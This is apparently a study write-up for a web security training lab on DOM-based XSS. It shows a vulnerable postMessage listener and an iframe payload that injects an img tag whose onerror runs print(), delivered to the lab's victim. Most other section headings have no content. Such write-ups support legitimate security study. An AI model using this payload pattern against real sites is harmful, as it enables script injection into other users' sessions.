# DOM-based vulnerabilities

## Practitioner

### DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

----

1. The home page contains an `addEventListener()` call that listens for a web message. 

```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

2. Create payload:

```html
<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

When the iframe loads, the `postMessage()` method sends a web message to the home page. The event listener, which is intended to serve `ads`, takes the content of the web message and inserts it into the `div` with the ID `ads`. However, in this case it inserts our `img` tag, which contains an invalid `src` attribute. This throws an error, which causes the `onerror` event handler to execute the payload. 

![DOM-based](../../_static/images/dom-based1.png)

3. **Store** the exploit in the exploit server and **Deliver it to the victim**.

### DOM XSS using web messages and a JavaScript URL

### DOM XSS using web messages and JSON.parse

### DOM-based open redirection

### DOM-based cookie manipulation

## Expert

### Exploiting DOM clobbering to enable XSS

### Clobbering DOM attributes to bypass HTML filters
